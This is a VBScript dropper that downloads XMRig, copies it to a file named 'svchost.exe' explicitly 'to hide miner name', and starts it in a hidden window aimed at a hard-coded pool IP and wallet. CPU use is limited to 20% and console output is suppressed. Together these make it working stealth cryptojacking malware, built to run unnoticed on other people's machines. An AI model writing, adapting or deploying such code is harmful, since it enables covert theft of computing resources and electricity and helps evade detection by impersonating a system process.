' Start.vbs
' This script sets up a miner folder, downloads/extracts XMRig,
' configures it, and starts it silently.

' --- Configuration ---

' Setup miner folder on C: (no admin needed for C:\Miners if C:\ exists and permissions allow)
Dim minerFolder
minerFolder = "C:\Miners\xmrig" ' This is the target folder for the extracted miner files

' Worker name & wallet
Dim workerName, wallet
workerName = "worker1"  ' Change per device if needed
wallet = "BTC:1H8fueovMvcQLArhxw7P4QZ3FAfhEZg7CB." & workerName ' IMPORTANT: Replace with your actual wallet address prefix!

' Pool config (direct IP to avoid DNS issues)
Dim pool, password
pool = "159.203.162.18:3333" ' This is an example pool; ensure it's correct for your mining
password = "x"

' XMRig download URL and expected folder name structure within the zip
Dim xmrigDownloadUrl, expectedExeSubFolderName
xmrigDownloadUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
' This is the name of the folder *inside* the ZIP that is expected to contain xmrig.exe
expectedExeSubFolderName = "xmrig-6.21.0-msvc-win64" ' Adjusted based on common XMRig zip structure

' --- Script Logic ---

' WScript.Echo "--- Miner Setup Script ---"
' WScript.Echo "Current time: " & Now()

' WScript.Echo "Target miner folder: " & minerFolder
If Not FolderExists(minerFolder) Then
    ' WScript.Echo "Miner folder does not exist. Attempting to create it recursively..."
    CreateFolder minerFolder ' This will now handle creating C:\Miners if it doesn't exist
Else
    ' WScript.Echo "Miner folder already exists: " & minerFolder
End If

Dim exePath
' We'll determine the exact exePath after extraction
exePath = "" ' Initialize as empty

Dim exeFolderName ' This will store the actual extracted subfolder name (e.g., 'xmrig-6.21.0')
exeFolderName = expectedExeSubFolderName ' Start with the expected name

' WScript.Echo "Expected XMRig executable path will be determined after extraction."

' Check if the final xmrig.exe already exists in its intended location
If Not FileExists(minerFolder & "\" & expectedExeSubFolderName & "\xmrig.exe") Then
    Dim zipPath, tempExtractFolder
    zipPath = minerFolder & "\xmrig.zip"
    tempExtractFolder = minerFolder & "\temp_xmrig_extract" ' Temporary folder for extraction

    ' WScript.Echo "XMRig executable not found in final location. Proceeding with download and extraction."
    
    ' 1. Download the ZIP file
    ' WScript.Echo "Downloading XMRig from: " & xmrigDownloadUrl & " to " & zipPath
    DownloadFile xmrigDownloadUrl, zipPath
    
    ' Only proceed if download was successful
    If FileExists(zipPath) Then
        ' 2. Clean up and create the temporary extraction folder
        If FolderExists(tempExtractFolder) Then
            ' WScript.Echo "Cleaning up old temporary extraction folder: " & tempExtractFolder
            DeleteFolder tempExtractFolder ' Ensure it's clean if a previous run failed
        End If
        CreateFolder tempExtractFolder
        
        ' 3. Extract the ZIP to the temporary folder
        ' WScript.Echo "Extracting XMRig from: " & zipPath & " to " & tempExtractFolder
        ExpandZip zipPath, tempExtractFolder
        
        ' 4. Find the actual xmrig.exe path within the extracted contents
        Dim fso, extractedExeFound, subFolders, subFolder, objFile
        Set fso = CreateObject("Scripting.FileSystemObject")
        extractedExeFound = False
        
        ' Check directly in tempExtractFolder first
        If FileExists(tempExtractFolder & "\xmrig.exe") Then
            exePath = tempExtractFolder & "\xmrig.exe"
            exeFolderName = "" ' Indicate it's directly in the root of the extract
            extractedExeFound = True
            ' WScript.Echo "Found xmrig.exe directly in temporary extraction folder."
        End If

        ' If not found, check within subfolders (like xmrig-6.21.0-msvc-win64)
        If Not extractedExeFound Then
            Set subFolders = fso.GetFolder(tempExtractFolder).SubFolders
            For Each subFolder In subFolders
                If FileExists(subFolder.Path & "\xmrig.exe") Then
                    exePath = subFolder.Path & "\xmrig.exe"
                    ' Update exeFolderName to the *actual* folder name found
                    exeFolderName = fso.GetFileName(subFolder.Path)
                    extractedExeFound = True
                    ' WScript.Echo "Found xmrig.exe in subfolder: " & exeFolderName
                    Exit For
                End If
            Next
        End If
        Set fso = Nothing ' Release FSO object
        
        If Not extractedExeFound Then
            ' WScript.Echo "ERROR: xmrig.exe not found within the extracted ZIP contents in " & tempExtractFolder & ". Aborting."
            WScript.Quit 1 ' Exit if xmrig.exe can't be located after extraction
        Else
            ' 5. Move the extracted folder (or just xmrig.exe if extracted directly) to the final minerFolder
            Dim sourceFolderToMove, finalDestinationForMovedFolder
            Set fso = CreateObject("Scripting.FileSystemObject") ' Re-initialize FSO

            If exeFolderName <> "" Then ' If xmrig.exe was in a subfolder (e.g., xmrig-6.21.0-msvc-win64)
                sourceFolderToMove = tempExtractFolder & "\" & exeFolderName
                finalDestinationForMovedFolder = minerFolder & "\" & exeFolderName ' Target folder for the moved content
            Else ' If xmrig.exe was extracted directly into tempExtractFolder (e.g., temp_xmrig_extract\xmrig.exe)
                sourceFolderToMove = tempExtractFolder & "\xmrig.exe" ' Point to the exe itself
                finalDestinationForMovedFolder = minerFolder & "\xmrig.exe" ' Point to the final exe path
            End If

            ' If the target folder/file for the move already exists, delete it for a clean move
            If fso.FolderExists(finalDestinationForMovedFolder) Then
                '  WScript.Echo "WARNING: Final target folder for miner (" & finalDestinationForMovedFolder & ") already exists. Deleting it to ensure clean move."
                 DeleteFolder finalDestinationForMovedFolder ' Use DeleteFolder for folders
            ElseIf fso.FileExists(finalDestinationForMovedFolder) Then ' If it's a file
                '  WScript.Echo "WARNING: Final target file for miner (" & finalDestinationForMovedFolder & ") already exists. Deleting it to ensure clean move."
                 DeleteFile finalDestinationForMovedFolder ' Use DeleteFile for files
            End If

            ' Perform the move/copy operation
            If exeFolderName <> "" Then ' Moving a folder
                ' WScript.Echo "Moving extracted miner folder (" & sourceFolderToMove & ") to final location: " & finalDestinationForMovedFolder
                MoveFolder sourceFolderToMove, finalDestinationForMovedFolder ' Moves the folder itself
            Else ' Copying the exe directly
                ' WScript.Echo "Copying extracted xmrig.exe from (" & sourceFolderToMove & ") to final location: " & finalDestinationForMovedFolder
                CopyFile sourceFolderToMove, finalDestinationForMovedFolder ' Copies the file
            End If
            
            ' Update the global exePath variable to its final location
            exePath = minerFolder & "\" & exeFolderName & "\xmrig.exe"
            If exeFolderName = "" Then exePath = minerFolder & "\xmrig.exe" ' Adjust if no subfolder

            ' WScript.Echo "Deleting temporary extraction folder: " & tempExtractFolder
            DeleteFolder tempExtractFolder
        End If
        
        ' WScript.Echo "Deleting temporary zip file: " & zipPath
        DeleteFile zipPath
    Else
        ' WScript.Echo "Skipping extraction: Downloaded ZIP file not found or download failed."
        WScript.Quit 1 ' Exit if download failed
    End If
Else
    ' WScript.Echo "XMRig executable found at: " & minerFolder & "\" & expectedExeSubFolderName & "\xmrig.exe" & ". Skipping download and extraction."
    exePath = minerFolder & "\" & expectedExeSubFolderName & "\xmrig.exe" ' Set exePath if it already exists
    exeFolderName = expectedExeSubFolderName ' Ensure exeFolderName is consistent
End If

' Ensure exePath is correctly set before proceeding
If exePath = "" Or Not FileExists(exePath) Then
    ' WScript.Echo "CRITICAL ERROR: XMRig executable path could not be determined or file does not exist after all operations. Aborting."
    WScript.Quit 1
End If


' Resource limiting
Dim cpuCount, cpuThreads
cpuCount = GetCpuCount()
cpuThreads = Max(1, Floor(cpuCount * 0.2))  ' 20% CPU threads
' WScript.Echo "Detected CPU cores: " & cpuCount & ", setting CPU threads to: " & cpuThreads

Dim gpuPriority
gpuPriority = 2  ' Medium priority for GPU usage

' Large pages flag (only if admin)
Dim largePagesFlag
largePagesFlag = ""
If IsAdmin() Then
    largePagesFlag = "--large-pages"
    ' WScript.Echo "Running with administrator rights. Large pages will be attempted."
Else
    ' WScript.Echo "Running without large pages (administrator rights needed for --large-pages)."
End If

' Log file path
Dim logFile
logFile = minerFolder & "\miner.log"
' WScript.Echo "Miner log file will be at: " & logFile

' Rename exe to svchost.exe to hide miner name
Dim stealthExeName, stealthExePath
stealthExeName = "svchost.exe"
stealthExePath = minerFolder & "\" & exeFolderName & "\" & stealthExeName
If exeFolderName = "" Then stealthExePath = minerFolder & "\" & stealthExeName ' Adjust if no subfolder

If Not FileExists(stealthExePath) Then
    ' WScript.Echo "Renaming " & exePath & " to " & stealthExePath
    CopyFile exePath, stealthExePath ' This is the line that was failing before
Else
    ' WScript.Echo "Stealth executable already exists at: " & stealthExePath & ". Skipping rename."
End If

' Build miner argument list
Dim arguments
arguments = Array( _
    "--algo randomx", _
    "--url " & pool, _
    "--user " & wallet, _
    "--pass " & password, _
    "--cpu-threads " & cpuThreads, _
    largePagesFlag, _
    "--print-time 60", _
    "--log-file " & logFile, _
    "--donate-level 1", _
    "--no-color", _
    "--api-port 0", _
    "--cuda-priority " & gpuPriority _
)

' Join arguments to single string
Dim argString
argString = Join(arguments, " ")

' Start miner silently with renamed exe
If FileExists(stealthExePath) Then ' Only start if stealth exe was successfully created/found
    ' WScript.Echo "Starting miner silently with arguments: " & argString
    StartProcess stealthExePath, argString

    ' WScript.Echo "Miner process initiated. Check logs at: " & logFile
Else
    ' WScript.Echo "ERROR: Cannot start miner. Stealth executable not found at: " & stealthExePath & ". Aborting."
    WScript.Quit 1
End If

WScript.Echo "--- Script Finished ---"

' --- Function Definitions ---

Function FolderExists(folderPath)
    Dim fso
    Set fso = CreateObject("Scripting.FileSystemObject")
    FolderExists = fso.FolderExists(folderPath)
End Function

Sub CreateFolder(folderPath)
    Dim fso
    Set fso = CreateObject("Scripting.FileSystemObject")

    If fso.FolderExists(folderPath) Then
        ' WScript.Echo "Folder already exists: " & folderPath
        Exit Sub
    End If

    Dim parentFolder
    parentFolder = fso.GetParentFolderName(folderPath)

    If parentFolder <> "" And Not fso.FolderExists(parentFolder) Then
        ' WScript.Echo "Parent folder missing: " & parentFolder & ". Creating recursively..."
        CreateFolder parentFolder
    End If

    If Not fso.FolderExists(folderPath) Then
        On Error Resume Next
        fso.CreateFolder(folderPath)
        If Err.Number <> 0 Then
            ' WScript.Echo "ERROR: Failed to create folder " & folderPath & ": " & Err.Description
            WScript.Quit 1
        Else
            ' WScript.Echo "Successfully created folder: " & folderPath
        End If
        On Error GoTo 0
    End If
End Sub

Function FileExists(filePath)
    Dim fso
    Set fso = CreateObject("Scripting.FileSystemObject")
    FileExists = fso.FileExists(filePath)
End Function

Sub DownloadFile(url, savePath)
    On Error Resume Next
    Dim objXMLHTTP, objStream
    Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    objXMLHTTP.Open "GET", url, False
    objXMLHTTP.send

    If objXMLHTTP.status = 200 Then
        Set objStream = CreateObject("ADODB.Stream")
        objStream.Type = 1 ' binary
        objStream.Open
        objStream.Write objXMLHTTP.responseBody
        objStream.SaveToFile savePath, 2 ' overwrite
        objStream.Close
        ' WScript.Echo "Successfully downloaded " & url & " to " & savePath
    Else
        ' WScript.Echo "ERROR: Failed to download " & url & ". HTTP Status: " & objXMLHTTP.status & " (" & objXMLHTTP.statusText & ")"
        WScript.Quit 1
    End If
    Set objStream = Nothing
    Set objXMLHTTP = Nothing
    On Error GoTo 0
End Sub

Sub ExpandZip(zipPath, destinationPath)
    Dim objShell, objFSO, objSource, objTarget

    If Not FolderExists(destinationPath) Then
        ' WScript.Echo "WARNING: Destination folder for extraction (" & destinationPath & ") not found. Attempting to create it."
        CreateFolder destinationPath
    End If

    Set objShell = CreateObject("Shell.Application")
    Set objFSO = CreateObject("Scripting.FileSystemObject")

    If objFSO.FileExists(zipPath) Then
        Set objSource = objShell.NameSpace(zipPath)
        Set objTarget = objShell.NameSpace(destinationPath)

        On Error Resume Next
        objTarget.CopyHere objSource.Items, 16 ' The 16 flag suppresses progress dialog

        If Err.Number <> 0 Then
            ' WScript.Echo "ERROR: During ZIP extraction (" & zipPath & " to " & destinationPath & "): " & Err.Description & " (Error Number: " & Err.Number & ")"
            WScript.Quit 1
        Else
            ' WScript.Echo "ZIP file extracted successfully from " & zipPath & "."
        End If
        On Error GoTo 0

        Set objSource = Nothing
        Set objTarget = Nothing
    Else
        ' WScript.Echo "ERROR: ZIP file not found at " & zipPath & ". Cannot extract."
        WScript.Quit 1
    End If

    Set objFSO = Nothing
    Set objShell = Nothing
End Sub

Sub DeleteFile(filePath)
    Dim fso
    Set fso = CreateObject("Scripting.FileSystemObject")
    If FileExists(filePath) Then
        On Error Resume Next
        fso.DeleteFile(filePath)
        If Err.Number <> 0 Then
            ' WScript.Echo "WARNING: Could not delete file " & filePath & ": " & Err.Description
        Else
            ' WScript.Echo "Deleted file: " & filePath
        End If
        On Error GoTo 0
    Else
        ' WScript.Echo "Info: File not found for deletion (already gone or never existed): " & filePath
    End If
End Sub

Sub DeleteFolder(folderPath)
    Dim fso
    Set fso = CreateObject("Scripting.FileSystemObject")
    If fso.FolderExists(folderPath) Then
        On Error Resume Next
        fso.DeleteFolder folderPath, True ' True to delete contents and subfolders
        If Err.Number <> 0 Then
            ' WScript.Echo "WARNING: Could not delete folder " & folderPath & ": " & Err.Description
        Else
            ' WScript.Echo "Deleted folder: " & folderPath
        End If
        On Error GoTo 0
    Else
        ' WScript.Echo "Info: Folder not found for deletion (already gone or never existed): " & folderPath
    End If
End Sub

Sub MoveFolder(sourceFolder, destinationFolder)
    Dim fso
    Set fso = CreateObject("Scripting.FileSystemObject")
    If fso.FolderExists(sourceFolder) Then
        On Error Resume Next
        ' This move will attempt to move the folder itself into the destination.
        ' If destinationFolder is "C:\Miners\xmrig", and sourceFolder is "C:\Miners\xmrig\temp_xmrig_extract\xmrig-6.21.0",
        ' the result will be "C:\Miners\xmrig\xmrig-6.21.0"
        fso.MoveFolder sourceFolder, destinationFolder
        If Err.Number <> 0 Then
            ' WScript.Echo "ERROR: Failed to move folder " & sourceFolder & " to " & destinationFolder & ": " & Err.Description
            WScript.Quit 1
        Else
            ' WScript.Echo "Moved folder " & sourceFolder & " to " & destinationFolder
        End If
        On Error GoTo 0
    Else
        ' WScript.Echo "ERROR: Source folder not found for move operation: " & sourceFolder
        WScript.Quit 1
    End If
End Sub

Sub CopyFile(sourcePath, destinationPath)
    Dim fso
    Set fso = CreateObject("Scripting.FileSystemObject")
    If FileExists(sourcePath) Then
        On Error Resume Next
        fso.CopyFile sourcePath, destinationPath, True ' True to overwrite existing file
        If Err.Number <> 0 Then
            ' WScript.Echo "ERROR: Failed to copy " & sourcePath & " to " & destinationPath & ": " & Err.Description
            WScript.Quit 1
        Else
            ' WScript.Echo "Copied " & sourcePath & " to " & destinationPath
        End If
        On Error GoTo 0
    Else
        ' WScript.Echo "ERROR: Source file not found for copy operation: " & sourcePath
        WScript.Quit 1
    End If
End Sub

Function GetCpuCount()
    Dim objWMIService, colItems, objItem
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colItems = objWMIService.ExecQuery("Select * from Win32_Processor")
    For Each objItem In colItems
        GetCpuCount = objItem.NumberOfLogicalProcessors
        Exit For
    Next
    If IsEmpty(GetCpuCount) Then GetCpuCount = 1
End Function

Function Max(a, b)
    If a > b Then
        Max = a
    Else
        Max = b
    End If
End Function

Function Floor(value)
    Floor = Int(value)
End Function

Function IsAdmin()
    Dim objShell, bIsAdmin
    Set objShell = CreateObject("Shell.Application")
    On Error Resume Next
    bIsAdmin = objShell.NameSpace(0).Self.IsLink
    If Err.Number <> 0 Then
        Dim fsoTest
        Set fsoTest = CreateObject("Scripting.FileSystemObject")
        On Error Resume Next
        fsoTest.CreateTextFile "C:\Program Files\temp_admin_check.txt", True
        bIsAdmin = (Err.Number = 0)
        If bIsAdmin Then fsoTest.DeleteFile "C:\Program Files\temp_admin_check.txt"
        On Error GoTo 0
    End If
    IsAdmin = bIsAdmin
    Set objShell = Nothing
End Function

Sub StartProcess(filePath, arguments)
    Dim objShell
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run """" & filePath & """ " & arguments, 0, False
End Sub